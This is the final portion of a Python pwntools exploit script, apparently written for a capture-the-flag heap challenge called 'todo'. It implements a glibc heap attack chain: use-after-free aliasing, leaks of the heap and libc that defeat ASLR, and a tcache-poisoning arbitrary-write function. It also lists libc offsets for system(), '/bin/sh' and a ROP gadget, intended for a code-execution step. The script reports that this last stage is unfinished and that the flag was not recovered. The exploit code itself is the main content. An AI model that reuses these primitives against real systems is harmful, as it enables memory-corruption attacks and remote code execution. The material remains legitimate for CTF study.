#       index whose post-phase4 real chunk is the *shrunk-to-minimum*
#       remnant of one of forge_chunk()'s TC/B pairs forces any same-size
#       re-request to GROW (realloc can't satisfy it in place), and while
#       the target tcache bin is still empty that grow's internal
#       malloc() does NOT pull a clean top-chunk extension like it would
#       on a fresh connection -- it is forced into glibc's unsorted-bin
#       scan/sort path instead, because phase4's own forging left a
#       "last_remainder"-style leftover chunk resident there (the tail end
#       of whatever the final probe malloc() didn't consume). That scan
#       path, applied to debris adjacent to the deliberately-forged
#       oversized headers, was observed (locally, against the exact
#       shipped `todo`+`libc.so.6`, run repeatedly under gdb for live
#       inspection) to trip glibc's OWN consistency checks with two
#       different abort messages depending on exactly which index pair was
#       reused for the new virgin-tcache-leak step:
#         - `realloc(): invalid old size`
#         - `malloc(): invalid next->prev_inuse (unsorted)`
#       Switching the first ("P1-establishing") index to one whose
#       post-phase4 real chunk is ALREADY >= the new target size (so that
#       step takes realloc's in-place SHRINK path instead of a GROW --
#       deterministic, never touches the unsorted bin) fixed the first
#       abort, but the SECOND required grow (the one that reclaims that
#       same freshly-freed chunk into a different index, needed to
#       legitimately "own" it for the later corruption write) still
#       forces a GROW while that specific size class is virgin, and still
#       reaches the same unsorted-bin debris. The fully-working fix is
#       very likely "explicitly drain/consume phase4's leftover unsorted-
#       bin remainder (with a few disposable allocations of its own,
#       unrelated size classes) before touching the new, poison-dedicated
#       size class at all" (or equivalently, choose forge_chunk()'s own
#       MINT counts so nothing is left resting in the unsorted bin after
#       the probe) -- reasoned through but NOT YET IMPLEMENTED/VERIFIED
#       end-to-end live. `phase5_tcache_poison_write()` below is left in
#       as the best-effort, partially-verified attempt (the `virgin_leak_
#       and_hold()` helper's OWN leak mechanic, reusing phase1/phase4's
#       already-proven virgin-tcache-fd trick, was confirmed working
#       stand-alone); it is NOT wired into `main()`'s run because it does
#       not yet reliably avoid the abort above. `challenge.yaml`'s `test:`
#       section is intentionally left unwired as a result.
# =============================================================================


def reset_to_min(t, idx):
    """Shrink whatever real chunk `idx` currently aliases down to the
    minimum chunksize (0x20) via a 1-byte request (no content is actually
    written: readline()'s read(fd,buf,0) is a no-op), so a LATER post() of
    a larger size is guaranteed to take realloc()'s GROW path."""
    t.post(idx, 1)


def virgin_leak_and_hold(t, idx_a, idx_b, S):
    """
    Phase1-style virgin-tcache-fd leak, generalized to arbitrary indices:
    idx_a must currently alias a real chunk whose chunksize is ALREADY >=
    request2size(S) (so this takes realloc's in-place SHRINK path, never a
    grow -- avoiding phase4 leftover unsorted-bin interactions). idx_b is
    reset to minimum first, so ITS reclaim of the just-freed chunk is a
    genuine grow/tcache-pop (safe: by the time it runs, the target tcache
    bin already holds the chunk idx_a just freed, so tcache has priority
    over the unsorted bin regardless of what debris is resting there).

    Leaves the bin with exactly 1 resident entry (the chunk, "P"), with
    idx_b's bookkeeping {ptr=P, size=S} intact (dangling-but-readable: P is
    free, but idx_b's own `read_my_note()`/`post_my_note()` calls still
    target it directly). Returns shifted = P>>12 (the safe-linking XOR key
    for P, recovered because the bin is virgin at the moment of the
    leaking free -- see phase1 for the full derivation) or None if the
    leaked bytes came back short (same ~1/256-chance truncation as phase1,
    needs a retry).
    """
    t.post(idx_a, S, b"A" * (S - 8))  # shrink in place; ptr unchanged
    t.post(idx_a, 0)  # free -> tcache bin for this class: count=1, head=P
    reset_to_min(t, idx_b)
    t.post(idx_b, S, b"B" * (S - 8))  # grow -> pops P (tcache, count=0)
    t.post(idx_a, 0)  # re-free P via idx_a's stale ptr: count=1 again, virgin
    out = t.read_all()
    leak = parse_note_line(out, idx_b)
    if not leak or len(leak) < 4:
        return None
    leak_padded = leak + b"\x00" * (8 - len(leak))
    return struct.unpack("<Q", leak_padded)[0]


def phase5_tcache_poison_write(t, idx_a, idx_b, idx_temp, idx_y, idx_k1, idx_k2, S_t, target, payload):
    """
    Best-effort, NOT YET FULLY VERIFIED tcache-poison write primitive (see
    the phase 5 comment block above for the known remaining blocker).

    idx_a must alias a real chunk >= request2size(S_t) (shrink-safe). The
    other 5 indices' prior state matters less but all 6 must reference
    distinct physical addresses at the start, and S_t's resulting
    chunksize must be a class nothing else active still depends on.

    On success, a FRESH index's post() lands `payload` directly at
    `target`; that same fresh index's read_my_note() thereafter is an
    arbitrary-address read.
    """
    shifted = virgin_leak_and_hold(t, idx_a, idx_b, S_t)
    if shifted is None:
        return False

    # Pop P out entirely (tcache bin for S_t's class -> empty).
    reset_to_min(t, idx_temp)
    t.post(idx_temp, S_t, b"T" * (S_t - 8))

    # Free a second, unrelated chunk Y into the now-virgin bin (head=Y, count=1).
    reset_to_min(t, idx_y)
    t.post(idx_y, S_t, b"Y" * (S_t - 8))
    t.post(idx_y, 0)

    # Re-free P (idx_a's stale ptr) ON TOP of Y: head=P, count=2 -- P is
    # NOT the bottom entry this time, so popping it still leaves count=1.
    t.post(idx_a, 0)

    # Corrupt P's own fd/next field via idx_b's stale-but-still-correctly-
    # sized ptr (post_my_note()'s "old size(S_t) < new size(S_t)" check is
    # false, so the pointer-refresh branch is skipped and the write lands
    # at P regardless of what realloc(P, S_t) does -- and since P's real
    # header already matches S_t exactly, realloc is a true no-op here).
    forged_fd = shifted ^ target
    buf = bytearray(b"\x00" * (S_t - 1))
    buf[0:8] = struct.pack("<Q", forged_fd)
    t.post(idx_b, S_t, bytes(buf), exact=True)

    # Pop #1: consumes P (real address), reveals `target` as the new head.
    reset_to_min(t, idx_k1)
    t.post(idx_k1, S_t, b"K" * (S_t - 8))

    # Pop #2: tcache_get() returns `target` directly (no validation at
    # all on a tcache pop); a fresh index's pointer-refresh then stores it,
    # and readline() writes `payload` straight to `target`.
    reset_to_min(t, idx_k2)
    assert len(payload) == S_t - 1, (len(payload), S_t)
    t.post(idx_k2, S_t, payload, exact=True)
    return True


def main():
    io = remote(HOST, PORT)
    io.recvuntil(b"> ")  # drain the startup banner + first menu prompt
    t = Todo(io)

    phase0_confirm_aliasing(t)
    heap_chunk_addr = phase1_heap_leak(t)
    phase2_overflow_write_and_minting(t)
    io.close()

    # Phase 3 needs all 10 todo indices, so it runs on its own fresh
    # connection rather than fighting phases 0-2 for index budget.
    phase3_forge_unsorted_bin_chunk_standalone()

    # Phase 4 (this pass's breakthrough): retry a few times, since any
    # individual byte of the leaked pointer independently has a small
    # chance of itself being 0x00 (truncating that one read short) --
    # unrelated to the sentinel-alignment bug phase 4 actually fixes.
    libc_base = None
    for attempt in range(5):
        libc_base = phase4_reliable_libc_leak_standalone()
        if libc_base:
            break

    if libc_base:
        log.success(
            "BREAKTHROUGH this pass: a genuine, reliable libc base leak "
            "(%#x) via a deliberately-placed smaller 'decoy' forged chunk "
            "that intercepts glibc's bin-scan ahead of the real target -- "
            "this is exactly the technique phase 3's final comment "
            "described as attempted-but-not-stabilized, now working. This "
            "fully defeats libc ASLR with NO dependency on the one "
            "coincidentally-unlucky byte that blocked the unsorted-bin "
            "approach.",
            libc_base,
        )
    log.failure(
        "Summary: all of phases 0-3's primitives (UAF aliasing, heap "
        "leak, arbitrary-length stale-pointer OOB write, unlimited heap "
        "'minting', and forcing a forged chunk into glibc's real "
        "unsorted/large bins) are reproduced and confirmed exactly as "
        "before, PLUS phase 4 reliably recovers the real libc base (%s) "
        "via a decoy-protected double-forge. THIS PASS additionally: (1) "
        "confirmed via readelf/checksec that `todo` is Full RELRO + "
        "canary + NX + PIE (ruling out a GOT overwrite, motivating a "
        "stack-return-address target instead), (2) independently computed "
        "and verified every address the final RCE step needs against the "
        "exact shipped libc.so.6 -- environ=+0x1f6d00, a `pop rdi; ret` "
        "gadget=+0x2d6c2, \"/bin/sh\"=+0x1b0ff8, system()=+0x4dfa0, plus "
        "4 one_gadget candidates (installed and run locally) as a "
        "fallback -- and (3) designed and partially verified "
        "(phase5_tcache_poison_write(); see the phase 5 comment block "
        "above the function for the full writeup) a tcache-poison write "
        "primitive built entirely from the EXISTING stale-pointer OOB "
        "write: its own virgin-tcache-leak sub-step was confirmed working "
        "standalone, but wiring it onto the SAME connection phase4 just "
        "used (required, since libc ASLR is re-rolled per TCP connection) "
        "means every todo index is already entangled in phase4's forged "
        "heap state, and the specific grow/shrink sequencing needed to "
        "reclaim a size class cleanly without tripping glibc's own heap-"
        "consistency aborts (reproduced live, repeatedly, as both "
        "'realloc(): invalid old size' and 'malloc(): invalid "
        "next->prev_inuse (unsorted)' depending on which indices were "
        "reused) was NOT fully solved in the time available. The most "
        "promising untried fix (reasoned through, not yet implemented): "
        "explicitly drain phase4's leftover unsorted-bin 'last_remainder' "
        "debris with a couple of disposable allocations before ever "
        "touching the new, poison-dedicated size class. Flag NOT "
        "recovered; challenge.yaml's test: section is intentionally left "
        "unwired.",
        hex(libc_base) if libc_base else "N/A (all retries came back short)",
    )
    sys.exit(1)



if __name__ == "__main__":
    main()
